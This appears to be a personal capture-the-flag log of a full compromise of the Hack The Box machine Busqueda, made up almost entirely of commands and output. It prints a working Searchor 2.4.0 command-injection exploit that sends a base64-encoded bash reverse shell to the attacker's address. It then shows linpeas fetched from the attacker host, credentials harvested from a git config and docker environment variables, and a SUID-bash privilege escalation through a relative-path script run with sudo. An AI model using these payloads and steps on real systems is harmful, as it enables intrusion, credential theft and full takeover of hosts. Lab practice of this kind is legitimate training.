```
┌──(witty㉿kali)-[~/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─$ rustscan -a 10.10.11.208 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.11.208:22
Open 10.10.11.208:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 22:07 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:07
Completed Parallel DNS resolution of 1 host. at 22:07, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:07
Scanning 10.10.11.208 [2 ports]
Discovered open port 22/tcp on 10.10.11.208
Discovered open port 80/tcp on 10.10.11.208
Completed Connect Scan at 22:07, 0.17s elapsed (2 total ports)
Initiating Service scan at 22:07
Scanning 2 services on 10.10.11.208
Completed Service scan at 22:07, 6.36s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.208.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 4.93s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.71s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
Nmap scan report for 10.10.11.208
Host is up, received user-set (0.17s latency).
Scanned at 2023-07-27 22:07:26 EDT for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds

┌──(witty㉿kali)-[~/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─$ tac /etc/hosts
10.10.11.208  searcher.htb

Powered by Flask and Searchor 2.4.0

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.git
Cloning into 'Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection'...
remote: Enumerating objects: 36, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (35/35), done.
remote: Total 36 (delta 9), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (36/36), 9.12 KiB | 345.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection 
                                                                                  
┌──(witty㉿kali)-[~/Downloads/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection]
└─$ ls
exploit.sh  README.md
                                                                                  
┌──(witty㉿kali)-[~/Downloads/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection]
└─$ cat exploit.sh                                       
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else 
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: 

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
fi
                                                                                  

┌──(witty㉿kali)-[~/Downloads/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection]
└─$ chmod +x exploit.sh                  
                                                                                                                       
┌──(witty㉿kali)-[~/Downloads/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection]
└─$ ./exploit.sh searcher.htb 10.10.14.26
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.14.26:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection

┌──(witty㉿kali)-[~/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.11.208] 43938
bash: cannot set terminal process group (1690): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ id
id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
svc@busqueda:/var/www/app$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
svc@busqueda:/var/www/app$ ls
ls
app.py  templates
svc@busqueda:/var/www/app$ cat app.py
cat app.py
from flask import Flask, render_template, request, redirect
from searchor import Engine
import subprocess


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', options=Engine.__members__, error='')

@app.route('/search', methods=['POST'])
def search():
    try:
        engine = request.form.get('engine')
        query = request.form.get('query')
        auto_redirect = request.form.get('auto_redirect')
        
        if engine in Engine.__members__.keys():
            arg_list = ['searchor', 'search', engine, query]
            r = subprocess.run(arg_list, capture_output=True)
            url = r.stdout.strip().decode()
            if auto_redirect is not None:
                return redirect(url, code=302)
            else:
                return url

        else:
            return render_template('index.html', options=Engine.__members__, error="Invalid engine!")

    except Exception as e:
        print(e)
        return render_template('index.html', options=Engine.__members__, error="Something went wrong!")

if __name__ == '__main__':
    app.run(debug=False)

svc@busqueda:~$ cat user.txt
cat user.txt
9e66cfb612a8f098bc669eff6089ccb2

svc@busqueda:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

svc@busqueda:~$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
-rwsr-xr-x 1 root root 18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 138408 Dec  1  2022 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root messagebus 35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 40496 Nov 24  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 47480 Feb 21  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 232416 Mar  1 13:59 /usr/bin/sudo
-rwsr-xr-x 1 root root 59976 Nov 24  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 35192 Feb 21  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 35200 Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 72072 Nov 24  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 72712 Nov 24  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 55672 Feb 21  2022 /usr/bin/su
-rwsr-xr-x 1 root root 44808 Nov 24  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /snap/core20/1822/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /snap/core20/1822/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /snap/core20/1822/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Feb  7  2022 /snap/core20/1822/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /snap/core20/1822/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /snap/core20/1822/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  7  2022 /snap/core20/1822/usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 16  2023 /snap/core20/1822/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7  2022 /snap/core20/1822/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/1822/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Mar 30  2022 /snap/core20/1822/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 123560 Jan 25  2023 /snap/snapd/18357/usr/lib/snapd/snap-confine

svc@busqueda:~$ getcap / -r 2>/dev/null
getcap / -r 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/snap/core20/1822/usr/bin/ping cap_net_raw=ep

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.208 - - [27/Jul/2023 22:30:47] "GET /linpeas.sh HTTP/1.1" 200 -

svc@busqueda:/tmp$ wget http://10.10.14.26/linpeas.sh
wget http://10.10.14.26/linpeas.sh
--2023-07-28 02:30:46--  http://10.10.14.26/linpeas.sh
Connecting to 10.10.14.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   294KB/s    in 2.8s    

2023-07-28 02:30:49 (294 KB/s) - ‘linpeas.sh’ saved [828098/828098]

svc@busqueda:/tmp$ ls
ls
linpeas.sh
snap-private-tmp
systemd-private-8658bc348eab49fd92306fcec189d08f-apache2.service-EMOoPf
systemd-private-8658bc348eab49fd92306fcec189d08f-ModemManager.service-k4d5Ur
systemd-private-8658bc348eab49fd92306fcec189d08f-systemd-logind.service-I8PcEZ
systemd-private-8658bc348eab49fd92306fcec189d08f-systemd-resolved.service-q7WKaI
systemd-private-8658bc348eab49fd92306fcec189d08f-systemd-timesyncd.service-KVmtai
vmware-root_781-4290101162
svc@busqueda:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
svc@busqueda:/tmp$ ./linpeas.sh

╔══════════╣ Files inside others home (limit 20)
/var/www/app/templates/index.html
/var/www/app/app.py
/var/www/app/.git/index
/var/www/app/.git/HEAD
/var/www/app/.git/logs/HEAD
/var/www/app/.git/logs/refs/heads/main
/var/www/app/.git/logs/refs/remotes/origin/main
app/.git/config
/var/www/app/.git/COMMIT_EDITMSG
/var/www/app/.git/refs/heads/main
/var/www/app/.git/refs/remotes/origin/main
/var/www/app/.git/description
/var/www/app/.git/info/exclude
/var/www/app/.git/hooks/prepare-commit-msg.sample
/var/www/app/.git/hooks/update.sample
/var/www/app/.git/hooks/pre-rebase.sample
/var/www/app/.git/hooks/pre-push.sample
/var/www/app/.git/hooks/commit-msg.sample
/var/www/app/.git/hooks/fsmonitor-watchman.sample
/var/www/app/.git/hooks/pre-receive.sample

svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

svc@busqueda:/var/www/app/.git$ sudo -l
sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

svc@busqueda:/var/www/app/.git$ cd /opt/scripts/
cd /opt/scripts/
svc@busqueda:/opt/scripts$ ls
ls
check-ports.py  full-checkup.sh  install-flask.sh  system-checkup.py
svc@busqueda:/opt/scripts$ ls -lah
ls -lah
total 28K
drwxr-xr-x 3 root root 4.0K Dec 24  2022 .
drwxr-xr-x 4 root root 4.0K Mar  1 10:46 ..
-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
drwxr-x--- 8 root root 4.0K Apr  3 15:04 .git
-rwx--x--x 1 root root 3.3K Dec 24  2022 install-flask.sh
-rwx--x--x 1 root root 1.9K Dec 24  2022 system-checkup.py

svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
<o /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     -  : Run a full system checkup

svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
<python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] gitea.searcher.htb is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1690     │ 112m   │ 0    │ online    │ 0%       │ 29.1mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!

svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
<thon3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>

svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
<docker-inspect --format='{{json .Config}}' mysql_db
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}

svc@busqueda:/opt/scripts$ netstat -ntpl
netstat -ntpl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1690/python3        
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:39405         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -L 3000:127.0.0.1:3000 svc@searcher.htb
The authenticity of host 'searcher.htb (10.10.11.208)' can't be established.
ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'searcher.htb' (ED25519) to the list of known hosts.
svc@searcher.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul 28 02:54:02 AM UTC 2023

  System load:                      0.03564453125
  Usage of /:                       80.6% of 8.26GB
  Memory usage:                     59%
  Swap usage:                       0%
  Processes:                        249
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.208
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:6ec5


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
svc@busqueda:~$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)

http://127.0.0.1:3000/

"MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh"

┌──(witty㉿kali)-[~/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─$ tac /etc/hosts                                          
10.10.11.208  searcher.htb gitea.searcher.htb

nothing with user cody and pass of svc

login with administrator: yuiu1hoiu4i5ho1uh

scripts/system-checkup.py
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)

 arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))

svc@busqueda:~$ nano full-checkup.sh
svc@busqueda:~$ chmod +x full-checkup.sh
svc@busqueda:~$ cat full-checkup.sh
#!/bin/bash 
chmod +s /bin/bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.4M Jan  6  2022 /bin/bash
svc@busqueda:~$ bash -p
bash-5.1# cd /root
bash-5.1# ls
ecosystem.config.js  root.txt  scripts	snap
bash-5.1# cat root.txt 
3406a54fed1144ba0bc857f49ab11dfe
bash-5.1# cat ecosystem.config.js
module.exports = {
  apps: [
    {
      name: 'app',
      script: '/var/www/app/app.py',
      interpreter: 'python3',
      exec_mode: 'fork_mode',
      autorestart: true,
      cwd: '/var/www/app',
      error_file: '/root/.pm2/logs/app-error.log',
      out_file: '/root/.pm2/logs/app-out.log',
      pid_file: '/root/.pm2/pids/app-0.pid',
      env: {
        HOME: '/home/svc',
      },
      user: 'svc',
    },
  ],
};

```

![[Pasted image 20230727215923.png]]
![[Pasted image 20230727220718.png]]

[[MonitorsTwo]]
